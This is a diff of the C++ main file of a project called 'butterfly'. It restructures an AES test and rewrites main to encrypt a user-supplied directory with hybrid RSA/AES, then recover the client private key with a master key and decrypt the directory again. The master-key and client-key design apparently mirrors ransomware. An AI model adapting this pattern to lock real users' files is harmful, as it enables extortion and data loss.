@@ -97,46 +97,10 @@ void test_rsa_dec_evp()
 
 }
 
-int main(int argc, char *argv[])
+void test_aes()
 {
-    // parse args with the argument parser
-    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
-    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);
-
-    LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);
-    std::cout << "Start Application " << PROJECT_NAME << " with version " << arg._version << std::endl;
-    
-    //test_rsa_enc_evp();
-    //sleep(2);
-    //test_rsa_dec_evp();
-    //exit(1);
-    int i = 0;
-    /////// Hybrid Part ////////
-    while (i < 2)
-    {
-        // start encryption
-        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
-        encryptor->invokeDir("/home/christian/projects/butterfly/bin/data");
-
-        sleep(2);
-
-        // start decryption
-        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
-        std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem", "CPrivateRSA.bin");
-        //butterfly::writeBinFile("CPrivateRSA.pem.dec", cprivate.c_str(), static_cast<long>(cprivate.length()));
-
-        decryptor->invokeDir("/home/christian/projects/butterfly/bin/data");
-
-        i++;
-        LOG_INFO("NEW HYBRID ENCRYPTION ROUND " << i);
-        sleep(10);
-
-    }
-
-
 
     ////// AES PART ///////
-    /*
     std::unique_ptr<butterfly::aes::AESEncryptor> aesEncryptor(new butterfly::aes::AESEncryptor());
     aesEncryptor->generateAESKey();
     std::string aeskey = aesEncryptor->getAESKey();
@@ -155,7 +119,41 @@ int main(int argc, char *argv[])
     aesDecryptor->setAESIv(aesiv2);
     std::string s2 = "/home/christian/projects/butterfly/bin/data/test.pdf";
     aesDecryptor->decryptFile(s2);
-    */
-    
+
+}
+
+int main(int argc, char *argv[])
+{
+    // parse args with the argument parser
+    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
+    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);
+
+    LOG_INFO("Running " << PROJECT_NAME << " with version " << arg._version);
+    std::cout << "Running " << PROJECT_NAME << " with version " << arg._version << std::endl;
+
+
+    int i = 0;
+    /////// Hybrid Part ////////
+    while (i < 1)
+    {
+        // start encryption
+        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
+        std::cout << "Start Encryption from directory " << arg._dir << std::endl;
+        encryptor->invokeDir(arg._dir, arg._protected);
+
+        sleep(2);
+
+        // start decryption
+        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
+        decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem", butterfly::ENC_CPRIVATERSA_FILENAME);
+
+        decryptor->invokeDir(arg._dir);
+
+        i++;
+        LOG_INFO("NEW HYBRID ENCRYPTION ROUND " << i);
+        sleep(10);
+
+    }
+
      return 0;
 }
